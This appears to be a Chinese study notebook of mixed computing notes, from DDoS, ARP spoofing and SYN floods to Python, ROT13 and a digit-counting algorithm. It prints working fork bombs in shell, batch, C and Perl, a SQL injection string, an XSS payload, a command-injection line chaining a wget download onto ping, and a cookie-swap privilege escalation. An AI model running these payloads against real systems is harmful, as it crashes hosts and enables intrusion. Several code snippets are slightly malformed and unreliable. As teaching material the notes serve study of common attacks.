### 暴露真实IP会遭到DDos攻击
(DDoS:Distributed Denial of Service)分布式拒绝攻击

Windows 用户“一般被默认授予管理员权限，那意味着他们几乎可以访问系统中的一切”。Linux，反而很好地限制了“root”权限

macos “通过隐匿实现的安全”，这秉承了“让软件内部运作保持专有，从而不为人知是抵御攻击的最好方法”的理念

Windows 的流行本身就是个问题，操作系统的安全性可能很大程度上依赖于装机用户量的规模。对于恶意软件作者来说，Windows 提供了大的施展平台。专注其中可以让他们的努力发挥最大作用。
### 手机IMEI码
在手机拨号处输入"\*#06#"得到手机IMEI码,相当于手机的身份证号码,移动运营商通过IMEI码分辨用户设备，追踪用户地理位置，记录用户拨打电话、发送短信、上网等行为。(可怕)

### python控制浏览器
```
import webbrowser
webbrowser.open('http://baidu.com')
```
### pychram 安装第三方库失败解决方法
`pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package`

### ed2k
`ed2k`全称叫“`eDonkey2000 network`”(电驴???)，是一种文件共享网络，最初用于共享音乐、电影和软件。与多数文件共享网络一样，它是分布式的；**文件基于P2P原理存放于用户的电脑上而不是存储于一个中枢服务器**。

`eDonkey`客户端程序连接到这个网络来共享文件。而`eDonkey`服务器作为一个通讯中心，使用户在`ed2k`网络内查找文件。它的客户端和服务端可以工作于`Windows`、`Macintosh`(这是mac..汗颜)、`Linux`、`UNIX`操作系统。**任何人** 都可以作为服务器加入这个网络。由于服务器经常变化，客户端会经常更新它的服务器列表。
`eDonkey`用混合MD4摘要算法检查来识别文件。**这使ed2k网络可以将不同文件名的同一文件成功识别为一个文件，并使同一文件名的不同文件得以区分**(厉害)。`eDonkeyd`的另一特性是：**对大于9.8MB的文件，它在下载完成前将其分割；这将加速大型文件的发送**。为了便于文件搜索，一些Web站点对比较热门的文件建立 ed2k链接 ，这些网站通常也提供热门服务器列表便于用户更新。

### fork boom
fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的**拒绝服务攻击**。与病毒与蠕虫不同的是，fork炸弹**没有传染性**，而且fork炸弹会使对**同时执行进程、程序数设限的系统无法执行新程序**，**对于不设限的系统则使之停止响应**。
fork炸弹通过进程递归式派生(fork，亦即自我复制)，以使**系统拒绝服务甚至崩溃**。

fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此**消耗系统分配予进程的可用空间使进程表饱和**，而系统在进程表饱和后就无法运行新程序，**除非进程表中的某一进程终止**；但由于fork炸弹程序所创建的所有实例都会不断探测空缺的进程槽并尝试取用以创建新进程，因而即使在某进程终止后也基本不可能运行新进程。fork炸弹生成的子程序在消耗进程表空间的同时也会占用CPU和内存，从而导致系统与现有进程运行速度放缓，响应时间也会随之大幅增加，以致于无法正常完成任务，从而使系统的正常运作受到严重影响。由于现代Unix操作系统普遍采用运用写实拷贝技术，fork炸弹通常不会使进程表饱和。
除了恶意触发fork炸弹破坏的情况外，软件开发中有时也会不慎在程序中嵌入fork炸弹，如在用于监听网络套接字并行使客户端-服务器结构系统中服务器端职责的应用程序中可能需要无限地进行循环（loop）与派生（fork）操作（类似下节示例程序所示），而在这种情况下源代码内的细微错误就可能在测试中“引爆”fork炸弹。
以下程序段就是由Jaromil所作的在类UNIX系统的shell环境下触发fork炸弹的shell脚本代码，总共只用了13个字符（包括空格）：
`:(){ :|:& };:`
注解如下：
>:() # 定义函数,函数名为":",即每当输入":"时就会自动调用{}内代码
{ # ":"函数开始标识
: # 用递归方式调用":"函数本身
| # 并用管道(pipe)将其输出引至...
: # 另一次递归调用的":"函数
综上,":|:"表示的即是每次调用函数":"的时候就会生成两份拷贝
& # 调用间脱钩,以使最初的":"函数被杀死后为其所调用的两个":"函数还能继续执行
} # ":"函数结束标识
; # ":"函数定义结束后将要进行的操作...
: # 调用":"函数,"引爆"fork炸弹
其中函数名“:”只是简化的一例，实际实现时可以随意设定，一个较易理解（将函数名替换为“forkbomb”）的版本如下：
forkbomb(){ forkbomb|forkbomb &} ; forkbomb
(自身调用自身?....理解成死循环好了)

Windows下则可以批处理命令如下实现：
`%0|%0`

POSIX标准下的C与C++的实现：
`#include <unistd.h>int main(){while(1) fork();return0;}`

Perl语言的实现：
`fork while fork`

在系统中成功“引爆”fork炸弹后，我们可重启来使系统恢复正常运行；而若要以手动的方法使fork炸弹“熄火”，那前提就是必须杀死fork炸弹产生的所有进程。为此我们可以考虑使用程序来杀死fork炸弹产生的进程，但由于这一般需要创建新进程，且由于fork炸弹一直在探测与占用进程槽与内存空间，因而这一方法几乎不可能实现，而且用kill命令杀死进程后，释放出的进程槽又会被余下的fork炸弹线程所产生的新进程占用，
在Windows下，用户可以退出当前用户会话的方式使系统恢复正常，但此法奏效的前提是fork炸弹是在该用户的特定会话内触发的

---------------------------------------------
### SQL注入
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
`select * from username = ____ and password=_____`
`select * from username   "test" or ""="" and password="123456"`
### XSS
XSS则是攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
`<p style='color:red'>你好啊，尊敬的______<p>
`
`<p style='color:red'>你好啊，尊敬的 xxx<script>alert(1)</script><p>
`
### 远程命令执行
而远程命令执行，是用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致执行命令。
ping  _______
ping www.baidu.com & wget xxxxxxxxxxx
### 越权
越权漏洞是比较常见的漏洞类型，越权漏洞可以理解为，一个正常的用户A通常只能够对自己的一些信息进行增删改查，但是由于程序员的一时疏忽 ，对信息进行增删改查的时候没有进行一个判断，判断所需要操作的信息是否属于对应的用户，可以导致用户A可以操作其他人的信息。
`Cookie: uid=11426;`
`Cookie: uid=1;`
----------------------------------------------------
### scrapy json中文乱码
可以在setting.py文件中修改默认的输出编码方式，只需要在setting.py中增加如下语句（默认似乎是没有指定的，所以要增加，如果默认有，就直接修改）
`FEED_EXPORT_ENCODING = 'utf-8'`

### rot13
ROT13 ("rotate by 13 places", sometimes hyphenated ROT-13) is a simple letter substitution cipher that **replaces a letter with the 13th letter after it**, in the alphabet. ROT13 is a special case of the Caesar cipher which was developed in ancient Rome.

Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding. The algorithm provides virtually no cryptographic security, and is often cited as a canonical example of weak encryption.

ROT13 is used in online forums as a means of hiding spoilers, punchlines, puzzle solutions, and offensive materials from the casual glance. ROT13 has inspired a variety of letter and word games on-line, and is frequently mentioned in newsgroup conversations.

#### 加密:
`tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< "The Quick Brown Fox Jumps Over The Lazy Dog"`
#### 解密:
`echo "The Quick Brown Fox Jumps Over The Lazy Dog" |tr 'N-ZA-Mn-za-m' 'A-Za-z'`

### Hex dump(十六进制转储)
In computing,a hex dump is a hexadecimal view (on screen or paper) of computer data, from RAM or from a file or storage device. Looking at a hex dump of data is commonly done as a part of debugging, or of reverse engineering.

In a hex dump, each byte (8-bits) is represented as a two-digit hexadecimal number.(每个字节==>两个十六进制的数) Hex dumps are commonly organized into rows of 8 or 16 bytes, sometimes separated by whitespaces. Some hex dumps have the hexadecimal memory address at the beginning and/or a checksum byte at the end of each line.

Although the name implies the use of base-16 output, some hex dumping software may have options for base-8 (octal) or base-10 (decimal) output. Some common names for this program function are hexdump, od, xxd and simply dump or even D.

**xxd 得到文件的头 得到的xxd文件要先-r出原来的文件哦**
### 解压方式
gzip -d(gunzip)
tar -zxvf
tar -xvf
bzip2 -d
----------------------------------------------------------
### xor 加密
例子:
```
import base64 as b64

def xor_encrypt(tips,key):
    ltips=len(tips)
    lkey=len(key)
    secret=[]
    num=0
    for each in tips:
        if num>=lkey:
            num=num%lkey
        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return b64.b64encode( "".join( secret ).encode() ).decode()


def xor_decrypt(secret,key):

    tips = b64.b64decode( secret.encode() ).decode()

    ltips=len(tips)
    lkey=len(key)
    secret=[]
    num=0
    for each in tips:
        if num>=lkey:
            num=num%lkey

        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return "".join( secret )


tips= "1234567"
key= "owen"
secret = xor_encrypt(tips,key)
print( "cipher_text:", secret )

plaintxt = xor_decrypt( secret, key )
print( "plain_text:",plaintxt )

```

### CIDR
一个ISP准备把一些C类网络分配给各个用户群，目前已经分配了三个C类网段给用户，如果没有实施CIDR技术。ISP的路由器的路由表中会有三条下连网段的路由条目，并且会把它通告给Internet上的路由器。通过实施CIDR技术，我们可以在ISP的路由器上把这三个网段198.168.1.0,198.168.2.0,198.168.3.0汇聚成一条路由198.168.0.0/22.这样ISP路由器只向Internet通告198.168.0.0/22这一条路由,大大减少了路由表的数目。从而为网络路由器节省出了存储空间。值得注意的是,使用CIDR技术汇聚的网络地址的比特位必须是一致的，如上例所示。如果ISP连接了一个172.178.1.0网段，这些网段路由将无法汇聚,无法实现CIDR技术。
`/XX` 就是前面有xx位的数字时不变的,形成一个区段
### arp
地址解析协议，即ARP（Address Resolution Protocol），是**根据IP地址获取物理地址**的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求**广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址**；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。(冒充)
### SYN
SYN：同步序列编号（Synchronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。
TCP连接的第一个包，非常小的一种数据包。SYN 攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。每个机器的欺骗包都要花几秒钟进行尝试方可放弃提供正常响应。
### sctp
四次握手
--------------------------------------------------------
### shell cd目录

source c.sh或者. ./c.sh，这时候就是直接在终端的shell执行脚本了，没有生成子shell，执行的结果就是输出历史命令，并且切换了目录。

注意上面. ./c.sh .和.中间有个空格！
### 计算1-n数字中 0-9出现的次数
算法实现：

暴力破解：

`函数do( ) `


```python
def do():

    with open("input.txt",'r') as f:

        file = f.read()

    d={}

    num = int(file)

    for i in range(1,num+1):

        numstr = str(i)

        for j in numstr:

            if(d.get(j) == None):

                d[j] = 0     #判断是否是none，是none的话要进行赋初值

            d[j] = d.get(j) + 1

    with open("output.txt",'w') as f:

        for i in range(10):

            for k,v in d.items(): #遍历字典

                if(int(k) == i):

                    string = str(v)+"\n"

                    f.write(string)

‘’‘

思路介绍：

读入页数。遍历1-n，将每一个数字转换成字符串进行遍历，在字典中储存

‘’‘
```



计算方式破解：

`函数degitCounts 得到单个数字的数量 `
```python
def digitCounts(k, n): 

    count  = 0

    for i in range(len(n)):

        number = int(n)

        level = pow(10,i)

        if (k == 0 and number//(level * 10) == 0):

            break

        cur = (number//level) %10#当前位

        bef = number//(10*level)#高位

        aft = number - number//level *level#低位  

        if(cur > k):

            count = count + (bef+1)* level

        elif(cur == k):

            count = count + bef * level + aft + 1

        else:

            count = count + bef * level

    if(k == 0):

        count = count - 1



return str(count)

‘’‘

思路介绍：

通过记录不同阶位下的同一数字的数量来进行统计

阶位：个位，十位……



如果 当前位 小于 k，数量=高位*阶位

如果 当前位 等于 k，数量=高位*阶位+低位+1

如果 当前位 大于 k，数量=（高位+1）*阶位



如果k = 0,要进行特殊处理

最高位不会是0

没有第0页

‘’‘’’

#函数do ( ) 进行文件操作



def do():

    with open("input.txt",'r') as f:

        number = f.read()

    with open("output.txt",'w') as f:

        for i in range(10):

            f.write(digitCounts(i,number)+"\n")



if __name__ == '__main__':

    do()
```
###
